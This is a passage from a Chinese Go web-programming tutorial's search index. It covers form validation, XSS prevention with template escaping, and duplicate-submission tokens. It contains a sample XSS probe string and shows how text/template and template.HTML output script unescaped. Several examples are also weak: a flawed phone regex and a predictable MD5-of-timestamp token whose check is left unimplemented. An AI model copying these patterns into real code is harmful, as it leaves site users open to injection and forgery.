{\n//\u592a\u5927\u4e86\n}\n</code></pre> \u8fd8\u6709\u4e00\u79cd\u65b9\u5f0f\u5c31\u662f\u6b63\u5219\u5339\u914d\u7684\u65b9\u5f0f <pre><code>if m, _ := regexp.MatchString(\"^[0-9]+$\", r.Form.Get(\"age\")); !m {\nreturn false\n}\n</code></pre> \u5bf9\u4e8e\u6027\u80fd\u8981\u6c42\u5f88\u9ad8\u7684\u7528\u6237\u6765\u8bf4\uff0c\u8fd9\u662f\u4e00\u4e2a\u8001\u751f\u5e38\u8c08\u7684\u95ee\u9898\u4e86\uff0c\u4ed6\u4eec\u8ba4\u4e3a\u5e94\u8be5\u5c3d\u91cf\u907f\u514d\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3a\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u901f\u5ea6\u4f1a\u6bd4\u8f83\u6162\u3002\u4f46\u662f\u5728\u76ee\u524d\u673a\u5668\u6027\u80fd\u90a3\u4e48\u5f3a\u52b2\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u8fd9\u79cd\u7b80\u5355\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u6548\u7387\u548c\u7c7b\u578b\u8f6c\u6362\u51fd\u6570\u662f\u6ca1\u6709\u4ec0\u4e48\u5dee\u522b\u7684\u3002\u5982\u679c\u4f60\u5bf9\u6b63\u5219\u8868\u8fbe\u5f0f\u5f88\u719f\u6089\uff0c\u800c\u4e14\u4f60\u5728\u5176\u5b83\u8bed\u8a00\u4e2d\u4e5f\u5728\u4f7f\u7528\u5b83\uff0c\u90a3\u4e48\u5728Go\u91cc\u9762\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5c06\u662f\u4e00\u4e2a\u4fbf\u5229\u7684\u65b9\u5f0f\u3002</p> <p>Go\u5b9e\u73b0\u7684\u6b63\u5219\u662fRE2\uff0c\u6240\u6709\u7684\u5b57\u7b26\u90fd\u662fUTF-8\u7f16\u7801\u7684\u3002</p>"},{"location":"04.2/#_3","title":"\u4e2d\u6587","text":"<p>\u6709\u65f6\u5019\u6211\u4eec\u60f3\u901a\u8fc7\u8868\u5355\u5143\u7d20\u83b7\u53d6\u4e00\u4e2a\u7528\u6237\u7684\u4e2d\u6587\u540d\u5b57\uff0c\u4f46\u662f\u53c8\u4e3a\u4e86\u4fdd\u8bc1\u83b7\u53d6\u7684\u662f\u6b63\u786e\u7684\u4e2d\u6587\uff0c\u6211\u4eec\u9700\u8981\u8fdb\u884c\u9a8c\u8bc1\uff0c\u800c\u4e0d\u662f\u7528\u6237\u968f\u4fbf\u7684\u4e00\u4e9b\u8f93\u5165\u3002\u5bf9\u4e8e\u4e2d\u6587\u6211\u4eec\u76ee\u524d\u6709\u4e24\u79cd\u65b9\u5f0f\u6765\u9a8c\u8bc1\uff0c\u53ef\u4ee5\u4f7f\u7528 <code>unicode</code> \u5305\u63d0\u4f9b\u7684 <code>func Is(rangeTab *RangeTable, r rune) bool</code> \u6765\u9a8c\u8bc1\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6b63\u5219\u65b9\u5f0f\u6765\u9a8c\u8bc1\uff0c\u8fd9\u91cc\u4f7f\u7528\u6700\u7b80\u5355\u7684\u6b63\u5219\u65b9\u5f0f\uff0c\u5982\u4e0b\u4ee3\u7801\u6240\u793a <pre><code>if m, _ := regexp.MatchString(\"^\\\\p{Han}+$\", r.Form.Get(\"realname\")); !m {\nreturn false\n}\n</code></pre></p>"},{"location":"04.2/#_4","title":"\u82f1\u6587","text":"<p>\u6211\u4eec\u671f\u671b\u901a\u8fc7\u8868\u5355\u5143\u7d20\u83b7\u53d6\u4e00\u4e2a\u82f1\u6587\u503c\uff0c\u4f8b\u5982\u6211\u4eec\u60f3\u77e5\u9053\u4e00\u4e2a\u7528\u6237\u7684\u82f1\u6587\u540d\uff0c\u5e94\u8be5\u662fastaxie\uff0c\u800c\u4e0d\u662fasta\u8c22\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5f88\u7b80\u5355\u7684\u901a\u8fc7\u6b63\u5219\u9a8c\u8bc1\u6570\u636e\uff1a <pre><code>if m, _ := regexp.MatchString(\"^[a-zA-Z]+$\", r.Form.Get(\"engname\")); !m {\nreturn false\n}\n</code></pre></p>"},{"location":"04.2/#_5","title":"\u7535\u5b50\u90ae\u4ef6\u5730\u5740","text":"<p>\u4f60\u60f3\u77e5\u9053\u7528\u6237\u8f93\u5165\u7684\u4e00\u4e2aEmail\u5730\u5740\u662f\u5426\u6b63\u786e\uff0c\u901a\u8fc7\u5982\u4e0b\u8fd9\u4e2a\u65b9\u5f0f\u53ef\u4ee5\u9a8c\u8bc1\uff1a <pre><code>if m, _ := regexp.MatchString(`^([\\w\\.\\_]{2,10})@(\\w{1,})\\.([a-z]{2,4})$`, r.Form.Get(\"email\")); !m {\nfmt.Println(\"no\")\n}else{\nfmt.Println(\"yes\")\n}\n</code></pre></p>"},{"location":"04.2/#_6","title":"\u624b\u673a\u53f7\u7801","text":"<p>\u4f60\u60f3\u8981\u5224\u65ad\u7528\u6237\u8f93\u5165\u7684\u624b\u673a\u53f7\u7801\u662f\u5426\u6b63\u786e\uff0c\u901a\u8fc7\u6b63\u5219\u4e5f\u53ef\u4ee5\u9a8c\u8bc1\uff1a <pre><code>if m, _ := regexp.MatchString(`^(1[3|4|5|8][0-9]\\d{4,8})$`, r.Form.Get(\"mobile\")); !m {\nreturn false\n}\n</code></pre></p>"},{"location":"04.2/#_7","title":"\u4e0b\u62c9\u83dc\u5355","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u5224\u65ad\u8868\u5355\u91cc\u9762<code>&lt;select&gt;</code>\u5143\u7d20\u751f\u6210\u7684\u4e0b\u62c9\u83dc\u5355\u4e2d\u662f\u5426\u6709\u88ab\u9009\u4e2d\u7684\u9879\u76ee\u3002\u6709\u4e9b\u65f6\u5019\u9ed1\u5ba2\u53ef\u80fd\u4f1a\u4f2a\u9020\u8fd9\u4e2a\u4e0b\u62c9\u83dc\u5355\u4e0d\u5b58\u5728\u7684\u503c\u53d1\u9001\u7ed9\u4f60\uff0c\u90a3\u4e48\u5982\u4f55\u5224\u65ad\u8fd9\u4e2a\u503c\u662f\u5426\u662f\u6211\u4eec\u9884\u8bbe\u7684\u503c\u5462\uff1f</p> <p>\u6211\u4eec\u7684select\u53ef\u80fd\u662f\u8fd9\u6837\u7684\u4e00\u4e9b\u5143\u7d20 <pre><code>&lt;select name=\"fruit\"&gt;\n&lt;option value=\"apple\"&gt;apple&lt;/option&gt;\n&lt;option value=\"pear\"&gt;pear&lt;/option&gt;\n&lt;option value=\"banana\"&gt;banana&lt;/option&gt;\n&lt;/select&gt;\n</code></pre> \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u8fd9\u6837\u6765\u9a8c\u8bc1 <pre><code>slice:=[]string{\"apple\",\"pear\",\"banana\"}\n\nv := r.Form.Get(\"fruit\")\nfor _, item := range slice {\nif item == v {\nreturn true\n}\n}\n\nreturn false\n</code></pre></p>"},{"location":"04.2/#_8","title":"\u5355\u9009\u6309\u94ae","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u8981\u5224\u65adradio\u6309\u94ae\u662f\u5426\u6709\u4e00\u4e2a\u88ab\u9009\u4e2d\u4e86\uff0c\u6211\u4eec\u9875\u9762\u7684\u8f93\u51fa\u53ef\u80fd\u5c31\u662f\u4e00\u4e2a\u7537\u3001\u5973\u6027\u522b\u7684\u9009\u62e9\uff0c\u4f46\u662f\u4e5f\u53ef\u80fd\u4e00\u4e2a15\u5c81\u5927\u7684\u65e0\u804a\u5c0f\u5b69\uff0c\u4e00\u624b\u62ff\u7740http\u534f\u8bae\u7684\u4e66\uff0c\u53e6\u4e00\u53ea\u624b\u901a\u8fc7telnet\u5ba2\u6237\u7aef\u5411\u4f60\u7684\u7a0b\u5e8f\u5728\u53d1\u9001\u8bf7\u6c42\u5462\uff0c\u4f60\u8bbe\u5b9a\u7684\u6027\u522b\u7537\u503c\u662f1\uff0c\u5973\u662f2\uff0c\u4ed6\u7ed9\u4f60\u53d1\u9001\u4e00\u4e2a3\uff0c\u4f60\u7684\u7a0b\u5e8f\u4f1a\u51fa\u73b0\u5f02\u5e38\u5417\uff1f\u56e0\u6b64\u6211\u4eec\u4e5f\u9700\u8981\u50cf\u4e0b\u62c9\u83dc\u5355\u7684\u5224\u65ad\u65b9\u5f0f\u7c7b\u4f3c\uff0c\u5224\u65ad\u6211\u4eec\u83b7\u53d6\u7684\u503c\u662f\u6211\u4eec\u9884\u8bbe\u7684\u503c\uff0c\u800c\u4e0d\u662f\u989d\u5916\u7684\u503c\u3002 <pre><code>&lt;input type=\"radio\" name=\"gender\" value=\"1\"&gt;\u7537\n&lt;input type=\"radio\" name=\"gender\" value=\"2\"&gt;\u5973\n</code></pre> \u90a3\u6211\u4eec\u4e5f\u53ef\u4ee5\u7c7b\u4f3c\u4e0b\u62c9\u83dc\u5355\u7684\u505a\u6cd5\u4e00\u6837 <pre><code>slice:=[]string{\"1\",\"2\"}\n\nfor _, v := range slice {\nif v == r.Form.Get(\"gender\") {\nreturn true\n}\n}\nreturn false\n</code></pre></p>"},{"location":"04.2/#_9","title":"\u590d\u9009\u6846","text":"<p>\u6709\u4e00\u9879\u9009\u62e9\u5174\u8da3\u7684\u590d\u9009\u6846\uff0c\u4f60\u60f3\u786e\u5b9a\u7528\u6237\u9009\u4e2d\u7684\u548c\u4f60\u63d0\u4f9b\u7ed9\u7528\u6237\u9009\u62e9\u7684\u662f\u540c\u4e00\u4e2a\u7c7b\u578b\u7684\u6570\u636e\u3002 <pre><code>&lt;input type=\"checkbox\" name=\"interest\" value=\"football\"&gt;\u8db3\u7403\n&lt;input type=\"checkbox\" name=\"interest\" value=\"basketball\"&gt;\u7bee\u7403\n&lt;input type=\"checkbox\" name=\"interest\" value=\"tennis\"&gt;\u7f51\u7403\n</code></pre> \u5bf9\u4e8e\u590d\u9009\u6846\u6211\u4eec\u7684\u9a8c\u8bc1\u548c\u5355\u9009\u6709\u70b9\u4e0d\u4e00\u6837\uff0c\u56e0\u4e3a\u63a5\u6536\u5230\u7684\u6570\u636e\u662f\u4e00\u4e2aslice <pre><code>slice:=[]string{\"football\",\"basketball\",\"tennis\"}\na:=Slice_diff(r.Form[\"interest\"],slice)\nif a == nil{\nreturn true\n}\n\nreturn false\n</code></pre> \u4e0a\u9762\u8fd9\u4e2a\u51fd\u6570<code>Slice_diff</code>\u5305\u542b\u5728\u6211\u5f00\u6e90\u7684\u4e00\u4e2a\u5e93\u91cc\u9762(\u64cd\u4f5cslice\u548cmap\u7684\u5e93)\uff0chttps://github.com/astaxie/beeku</p>"},{"location":"04.2/#_10","title":"\u65e5\u671f\u548c\u65f6\u95f4","text":"<p>\u4f60\u60f3\u786e\u5b9a\u7528\u6237\u586b\u5199\u7684\u65e5\u671f\u6216\u65f6\u95f4\u662f\u5426\u6709\u6548\u3002\u4f8b\u5982 \uff0c\u7528\u6237\u5728\u65e5\u7a0b\u8868\u4e2d\u5b89\u63928\u6708\u4efd\u7684\u7b2c45\u5929\u5f00\u4f1a\uff0c\u6216\u8005\u63d0\u4f9b\u672a\u6765\u7684\u67d0\u4e2a\u65f6\u95f4\u4f5c\u4e3a\u751f\u65e5\u3002</p> <p>Go\u91cc\u9762\u63d0\u4f9b\u4e86\u4e00\u4e2atime\u7684\u5904\u7406\u5305\uff0c\u6211\u4eec\u53ef\u4ee5\u628a\u7528\u6237\u7684\u8f93\u5165\u5e74\u6708\u65e5\u8f6c\u5316\u6210\u76f8\u5e94\u7684\u65f6\u95f4\uff0c\u7136\u540e\u8fdb\u884c\u903b\u8f91\u5224\u65ad <pre><code>t := time.Date(2009, time.November, 10, 23, 0, 0, 0, time.UTC)\nfmt.Printf(\"Go launched at %s\\n\", t.Local())\n</code></pre> \u83b7\u53d6time\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u8fdb\u884c\u5f88\u591a\u65f6\u95f4\u51fd\u6570\u7684\u64cd\u4f5c\u3002\u5177\u4f53\u7684\u5224\u65ad\u5c31\u6839\u636e\u81ea\u5df1\u7684\u9700\u6c42\u8c03\u6574\u3002</p>"},{"location":"04.2/#_11","title":"\u8eab\u4efd\u8bc1\u53f7\u7801","text":"<p>\u5982\u679c\u6211\u4eec\u60f3\u9a8c\u8bc1\u8868\u5355\u8f93\u5165\u7684\u662f\u5426\u662f\u8eab\u4efd\u8bc1\uff0c\u901a\u8fc7\u6b63\u5219\u4e5f\u53ef\u4ee5\u65b9\u4fbf\u7684\u9a8c\u8bc1\uff0c\u4f46\u662f\u8eab\u4efd\u8bc1\u670915\u4f4d\u548c18\u4f4d\uff0c\u6211\u4eec\u4e24\u4e2a\u90fd\u9700\u8981\u9a8c\u8bc1 <pre><code>//\u9a8c\u8bc115\u4f4d\u8eab\u4efd\u8bc1\uff0c15\u4f4d\u7684\u662f\u5168\u90e8\u6570\u5b57\nif m, _ := regexp.MatchString(`^(\\d{15})$`, r.Form.Get(\"usercard\")); !m {\nreturn false\n}\n\n//\u9a8c\u8bc118\u4f4d\u8eab\u4efd\u8bc1\uff0c18\u4f4d\u524d17\u4f4d\u4e3a\u6570\u5b57\uff0c\u6700\u540e\u4e00\u4f4d\u662f\u6821\u9a8c\u4f4d\uff0c\u53ef\u80fd\u4e3a\u6570\u5b57\u6216\u5b57\u7b26X\u3002\nif m, _ := regexp.MatchString(`^(\\d{17})([0-9]|X)$`, r.Form.Get(\"usercard\")); !m {\nreturn false\n}\n</code></pre> \u4e0a\u9762\u5217\u51fa\u4e86\u6211\u4eec\u4e00\u4e9b\u5e38\u7528\u7684\u670d\u52a1\u5668\u7aef\u7684\u8868\u5355\u5143\u7d20\u9a8c\u8bc1\uff0c\u5e0c\u671b\u901a\u8fc7\u8fd9\u4e2a\u5f15\u5bfc\u5165\u95e8\uff0c\u80fd\u591f\u8ba9\u4f60\u5bf9Go\u7684\u6570\u636e\u9a8c\u8bc1\u6709\u6240\u4e86\u89e3\uff0c\u7279\u522b\u662fGo\u91cc\u9762\u7684\u6b63\u5219\u5904\u7406\u3002</p>"},{"location":"04.2/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u5904\u7406\u8868\u5355\u7684\u8f93\u5165</li> <li>\u4e0b\u4e00\u8282: \u9884\u9632\u8de8\u7ad9\u811a\u672c</li> </ul>"},{"location":"04.3/","title":"4.3 \u9884\u9632\u8de8\u7ad9\u811a\u672c","text":"<p>\u73b0\u5728\u7684\u7f51\u7ad9\u5305\u542b\u5927\u91cf\u7684\u52a8\u6001\u5185\u5bb9\u4ee5\u63d0\u9ad8\u7528\u6237\u4f53\u9a8c\uff0c\u6bd4\u8fc7\u53bb\u8981\u590d\u6742\u5f97\u591a\u3002\u6240\u8c13\u52a8\u6001\u5185\u5bb9\uff0c\u5c31\u662f\u6839\u636e\u7528\u6237\u73af\u5883\u548c\u9700\u8981\uff0cWeb\u5e94\u7528\u7a0b\u5e8f\u80fd\u591f\u8f93\u51fa\u76f8\u5e94\u7684\u5185\u5bb9\u3002\u52a8\u6001\u7ad9\u70b9\u4f1a\u53d7\u5230\u4e00\u79cd\u540d\u4e3a\u201c\u8de8\u7ad9\u811a\u672c\u653b\u51fb\u201d\uff08Cross Site Scripting, \u5b89\u5168\u4e13\u5bb6\u4eec\u901a\u5e38\u5c06\u5176\u7f29\u5199\u6210 XSS\uff09\u7684\u5a01\u80c1\uff0c\u800c\u9759\u6001\u7ad9\u70b9\u5219\u5b8c\u5168\u4e0d\u53d7\u5176\u5f71\u54cd\u3002</p> <p>\u653b\u51fb\u8005\u901a\u5e38\u4f1a\u5728\u6709\u6f0f\u6d1e\u7684\u7a0b\u5e8f\u4e2d\u63d2\u5165JavaScript\u3001VBScript\u3001 ActiveX\u6216Flash\u4ee5\u6b3a\u9a97\u7528\u6237\u3002\u4e00\u65e6\u5f97\u624b\uff0c\u4ed6\u4eec\u53ef\u4ee5\u76d7\u53d6\u7528\u6237\u5e10\u6237\u4fe1\u606f\uff0c\u4fee\u6539\u7528\u6237\u8bbe\u7f6e\uff0c\u76d7\u53d6/\u6c61\u67d3cookie\u548c\u690d\u5165\u6076\u610f\u5e7f\u544a\u7b49\u3002</p> <p>\u5bf9XSS\u6700\u4f73\u7684\u9632\u62a4\u5e94\u8be5\u7ed3\u5408\u4ee5\u4e0b\u4e24\u79cd\u65b9\u6cd5\uff1a\u4e00\u662f\u9a8c\u8bc1\u6240\u6709\u8f93\u5165\u6570\u636e\uff0c\u6709\u6548\u68c0\u6d4b\u653b\u51fb(\u8fd9\u4e2a\u6211\u4eec\u524d\u9762\u5c0f\u8282\u5df2\u7ecf\u6709\u8fc7\u4ecb\u7ecd);\u53e6\u4e00\u4e2a\u662f\u5bf9\u6240\u6709\u8f93\u51fa\u6570\u636e\u8fdb\u884c\u9002\u5f53\u7684\u5904\u7406\uff0c\u4ee5\u9632\u6b62\u4efb\u4f55\u5df2\u6210\u529f\u6ce8\u5165\u7684\u811a\u672c\u5728\u6d4f\u89c8\u5668\u7aef\u8fd0\u884c\u3002</p> <p>\u90a3\u4e48Go\u91cc\u9762\u662f\u600e\u4e48\u505a\u8fd9\u4e2a\u6709\u6548\u9632\u62a4\u7684\u5462\uff1fGo\u7684html/template\u91cc\u9762\u5e26\u6709\u4e0b\u9762\u51e0\u4e2a\u51fd\u6570\u53ef\u4ee5\u5e2e\u4f60\u8f6c\u4e49</p> <ul> <li>func HTMLEscape(w io.Writer, b []byte)  //\u628ab\u8fdb\u884c\u8f6c\u4e49\u4e4b\u540e\u5199\u5230w</li> <li>func HTMLEscapeString(s string) string  //\u8f6c\u4e49s\u4e4b\u540e\u8fd4\u56de\u7ed3\u679c\u5b57\u7b26\u4e32</li> <li>func HTMLEscaper(args ...interface{}) string //\u652f\u6301\u591a\u4e2a\u53c2\u6570\u4e00\u8d77\u8f6c\u4e49\uff0c\u8fd4\u56de\u7ed3\u679c\u5b57\u7b26\u4e32</li> </ul> <p>\u6211\u4eec\u770b4.1\u5c0f\u8282\u7684\u4f8b\u5b50 <pre><code>fmt.Println(\"username:\", template.HTMLEscapeString(r.Form.Get(\"username\"))) //\u8f93\u51fa\u5230\u670d\u52a1\u5668\u7aef\nfmt.Println(\"password:\", template.HTMLEscapeString(r.Form.Get(\"password\")))\ntemplate.HTMLEscape(w, []byte(r.Form.Get(\"username\"))) //\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\n</code></pre> \u5982\u679c\u6211\u4eec\u8f93\u5165\u7684username\u662f<code>&lt;script&gt;alert()&lt;/script&gt;</code>,\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e0a\u9762\u770b\u5230\u8f93\u51fa\u5982\u4e0b\u6240\u793a\uff1a</p> <p></p> <p>\u56fe4.3 Javascript\u8fc7\u6ee4\u4e4b\u540e\u7684\u8f93\u51fa</p> <p>Go\u7684html/template\u5305\u9ed8\u8ba4\u5e2e\u4f60\u8fc7\u6ee4\u4e86html\u6807\u7b7e\uff0c\u4f46\u662f\u6709\u65f6\u5019\u4f60\u53ea\u60f3\u8981\u8f93\u51fa\u8fd9\u4e2a<code>&lt;script&gt;alert()&lt;/script&gt;</code>\u770b\u8d77\u6765\u6b63\u5e38\u7684\u4fe1\u606f\uff0c\u8be5\u600e\u4e48\u5904\u7406\uff1f\u8bf7\u4f7f\u7528text/template\u3002\u8bf7\u770b\u4e0b\u9762\u7684\u4f8b\u5b50\uff1a <pre><code>import \"text/template\"\n...\nt, err := template.New(\"foo\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"&lt;script&gt;alert('you have been pwned')&lt;/script&gt;\")\n</code></pre> \u8f93\u51fa</p> <pre><code>Hello, &lt;script&gt;alert('you have been pwned')&lt;/script&gt;!\n</code></pre> <p>\u6216\u8005\u4f7f\u7528template.HTML\u7c7b\u578b <pre><code>import \"html/template\"\n...\nt, err := template.New(\"foo\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", template.HTML(\"&lt;script&gt;alert('you have been pwned')&lt;/script&gt;\"))\n</code></pre> \u8f93\u51fa</p> <pre><code>Hello, &lt;script&gt;alert('you have been pwned')&lt;/script&gt;!\n</code></pre> <p>\u8f6c\u6362\u6210<code>template.HTML</code>\u540e\uff0c\u53d8\u91cf\u7684\u5185\u5bb9\u4e5f\u4e0d\u4f1a\u88ab\u8f6c\u4e49</p> <p>\u8f6c\u4e49\u7684\u4f8b\u5b50\uff1a <pre><code>import \"html/template\"\n...\nt, err := template.New(\"foo\").Parse(`{{define \"T\"}}Hello, {{.}}!{{end}}`)\nerr = t.ExecuteTemplate(out, \"T\", \"&lt;script&gt;alert('you have been pwned')&lt;/script&gt;\")\n</code></pre> \u8f6c\u4e49\u4e4b\u540e\u7684\u8f93\u51fa\uff1a</p> <pre><code>Hello, &amp;lt;script&amp;gt;alert(&amp;#39;you have been pwned&amp;#39;)&amp;lt;/script&amp;gt;!\n</code></pre>"},{"location":"04.3/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9a8c\u8bc1\u7684\u8f93\u5165</li> <li>\u4e0b\u4e00\u8282: \u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355</li> </ul>"},{"location":"04.4/","title":"4.4 \u9632\u6b62\u591a\u6b21\u9012\u4ea4\u8868\u5355","text":"<p>\u4e0d\u77e5\u9053\u4f60\u662f\u5426\u66fe\u7ecf\u770b\u5230\u8fc7\u4e00\u4e2a\u8bba\u575b\u6216\u8005\u535a\u5ba2\uff0c\u5728\u4e00\u4e2a\u5e16\u5b50\u6216\u8005\u6587\u7ae0\u540e\u9762\u51fa\u73b0\u591a\u6761\u91cd\u590d\u7684\u8bb0\u5f55\uff0c\u8fd9\u4e9b\u5927\u591a\u6570\u662f\u56e0\u4e3a\u7528\u6237\u91cd\u590d\u9012\u4ea4\u4e86\u7559\u8a00\u7684\u8868\u5355\u5f15\u8d77\u7684\u3002\u7531\u4e8e\u79cd\u79cd\u539f\u56e0\uff0c\u7528\u6237\u7ecf\u5e38\u4f1a\u91cd\u590d\u9012\u4ea4\u8868\u5355\u3002\u901a\u5e38\u8fd9\u53ea\u662f\u9f20\u6807\u7684\u8bef\u64cd\u4f5c\uff0c\u5982\u53cc\u51fb\u4e86\u9012\u4ea4\u6309\u94ae\uff0c\u4e5f\u53ef\u80fd\u662f\u4e3a\u4e86\u7f16\u8f91\u6216\u8005\u518d\u6b21\u6838\u5bf9\u586b\u5199\u8fc7\u7684\u4fe1\u606f\uff0c\u70b9\u51fb\u4e86\u6d4f\u89c8\u5668\u7684\u540e\u9000\u6309\u94ae\uff0c\u7136\u540e\u53c8\u518d\u6b21\u70b9\u51fb\u4e86\u9012\u4ea4\u6309\u94ae\u800c\u4e0d\u662f\u6d4f\u89c8\u5668\u7684\u524d\u8fdb\u6309\u94ae\u3002\u5f53\u7136\uff0c\u4e5f\u53ef\u80fd\u662f\u6545\u610f\u7684\u2014\u2014\u6bd4\u5982\uff0c\u5728\u67d0\u9879\u5728\u7ebf\u8c03\u67e5\u6216\u8005\u535a\u5f69\u6d3b\u52a8\u4e2d\u91cd\u590d\u6295\u7968\u3002\u90a3\u6211\u4eec\u5982\u4f55\u6709\u6548\u7684\u9632\u6b62\u7528\u6237\u591a\u6b21\u9012\u4ea4\u76f8\u540c\u7684\u8868\u5355\u5462\uff1f</p> <p>\u89e3\u51b3\u65b9\u6848\u662f\u5728\u8868\u5355\u4e2d\u6dfb\u52a0\u4e00\u4e2a\u5e26\u6709\u552f\u4e00\u503c\u7684\u9690\u85cf\u5b57\u6bb5\u3002\u5728\u9a8c\u8bc1\u8868\u5355\u65f6\uff0c\u5148\u68c0\u67e5\u5e26\u6709\u8be5\u552f\u4e00\u503c\u7684\u8868\u5355\u662f\u5426\u5df2\u7ecf\u9012\u4ea4\u8fc7\u4e86\u3002\u5982\u679c\u662f\uff0c\u62d2\u7edd\u518d\u6b21\u9012\u4ea4\uff1b\u5982\u679c\u4e0d\u662f\uff0c\u5219\u5904\u7406\u8868\u5355\u8fdb\u884c\u903b\u8f91\u5904\u7406\u3002\u53e6\u5916\uff0c\u5982\u679c\u662f\u91c7\u7528\u4e86Ajax\u6a21\u5f0f\u9012\u4ea4\u8868\u5355\u7684\u8bdd\uff0c\u5f53\u8868\u5355\u9012\u4ea4\u540e\uff0c\u901a\u8fc7javascript\u6765\u7981\u7528\u8868\u5355\u7684\u9012\u4ea4\u6309\u94ae\u3002</p> <p>\u6211\u7ee7\u7eed\u62ff4.2\u5c0f\u8282\u7684\u4f8b\u5b50\u4f18\u5316\uff1a <pre><code>&lt;input type=\"checkbox\" name=\"interest\" value=\"football\"&gt;\u8db3\u7403\n&lt;input type=\"checkbox\" name=\"interest\" value=\"basketball\"&gt;\u7bee\u7403\n&lt;input type=\"checkbox\" name=\"interest\" value=\"tennis\"&gt;\u7f51\u7403    \n\u7528\u6237\u540d:&lt;input type=\"text\" name=\"username\"&gt;\n\u5bc6\u7801:&lt;input type=\"password\" name=\"password\"&gt;\n&lt;input type=\"hidden\" name=\"token\" value=\"{{.}}\"&gt;\n&lt;input type=\"submit\" value=\"\u767b\u9646\"&gt;\n</code></pre> \u6211\u4eec\u5728\u6a21\u7248\u91cc\u9762\u589e\u52a0\u4e86\u4e00\u4e2a\u9690\u85cf\u5b57\u6bb5<code>token</code>\uff0c\u8fd9\u4e2a\u503c\u6211\u4eec\u901a\u8fc7MD5(\u65f6\u95f4\u6233)\u6765\u83b7\u53d6\u552f\u4e00\u503c\uff0c\u7136\u540e\u6211\u4eec\u628a\u8fd9\u4e2a\u503c\u5b58\u50a8\u5230\u670d\u52a1\u5668\u7aef(session\u6765\u63a7\u5236\uff0c\u6211\u4eec\u5c06\u5728\u7b2c\u516d\u7ae0\u8bb2\u89e3\u5982\u4f55\u4fdd\u5b58)\uff0c\u4ee5\u65b9\u4fbf\u8868\u5355\u63d0\u4ea4\u65f6\u6bd4\u5bf9\u5224\u5b9a\u3002 <pre><code>func login(w http.ResponseWriter, r *http.Request) {\nfmt.Println(\"method:\", r.Method) //\u83b7\u53d6\u8bf7\u6c42\u7684\u65b9\u6cd5\nif r.Method == \"GET\" {\ntimestamp := strconv.Itoa(time.Now().Nanosecond())\nhashWr := md5.New()\nhashWr.Write([]byte(timestamp))\ntoken := fmt.Sprintf(\"%x\", hashWr.Sum(nil))\n\nt, _ := template.ParseFiles(\"login.gtpl\")\nt.Execute(w, token)\n} else {\n//\u8bf7\u6c42\u7684\u662f\u767b\u9646\u6570\u636e\uff0c\u90a3\u4e48\u6267\u884c\u767b\u9646\u7684\u903b\u8f91\u5224\u65ad\nr.ParseForm()\ntoken := r.Form.Get(\"token\")\nif token != \"\" {\n//\u9a8c\u8bc1token\u7684\u5408\u6cd5\u6027\n} else {\n//\u4e0d\u5b58\u5728token\u62a5\u9519\n}\nfmt.Println(\"username length:\", len(r.Form[\"username\"][0]))\nfmt.Println(\"username:\", template.HTMLEscapeString(r.Form.Get(\"username\"))) //\u8f93\u51fa\u5230\u670d\u52a1\u5668\u7aef\nfmt.Println(\"password:\", template.HTMLEscapeString(r.Form.Get(\"password\")))\ntemplate.HTMLEscape(w, []byte(r.Form.Get(\"username\"))) //\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\n}\n}\n</code></pre> \u4e0a\u9762\u7684\u4ee3\u7801\u8f93\u51fa\u5230\u9875\u9762\u7684\u6e90\u7801\u5982\u4e0b\uff1a</p> <p></p> <p>\u56fe4.4 \u589e\u52a0token\u4e4b\u540e\u5728\u5ba2\u6237\u7aef\u8f93\u51fa\u7684\u6e90\u7801\u4fe1\u606f</p> <p>\u6211\u4eec\u770b\u5230token\u5df2\u7ecf\u6709\u8f93\u51fa\u503c\uff0c\u4f60\u53ef\u4ee5\u4e0d\u65ad\u7684\u5237\u65b0\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u4e2a\u503c\u5728\u4e0d\u65ad\u7684\u53d8\u5316\u3002\u8fd9\u6837\u5c31\u4fdd\u8bc1\u4e86\u6bcf\u6b21\u663e\u793aform\u8868\u5355\u7684\u65f6\u5019\u90fd\u662f\u552f\u4e00\u7684\uff0c\u7528\u6237\u9012\u4ea4\u7684\u8868\u5355\u4fdd\u6301\u4e86\u552f\u4e00\u6027\u3002</p> <p>\u6211\u4eec\u7684\u89e3\u51b3\u65b9\u6848\u53ef\u4ee5\u9632\u6b62\u975e\u6076\u610f\u7684\u653b\u51fb\uff0c\u5e76\u80fd\u4f7f\u6076\u610f\u7528\u6237\u6682\u65f6\u4e0d\u77e5\u6240\u63aa\uff0c\u7136\u540e\uff0c\u5b83\u5374\u4e0d\u80fd\u6392\u9664\u6240\u6709\u7684\u6b3a\u9a97\u6027\u7684\u52a8\u673a\uff0c\u5bf9\u6b64\u7c7b\u60c5\u51b5\u8fd8\u9700\u8981\u66f4\u590d\u6742\u7684\u5de5\u4f5c\u3002</p>"},{"location":"04.4/#links","title":"links","text":"<ul> <li>\u76ee\u5f55</li> <li>\u4e0a\u4e00\u8282: \u9884\u9632\u8de8\u7ad9\u811a\u672c</li> <li>\u4e0b\u4e00\u8282: \u5904\u7406\u6587\u4ef6\u4e0a\u4f20</li> </ul>"},{"location":"04.5/","title":"4.5 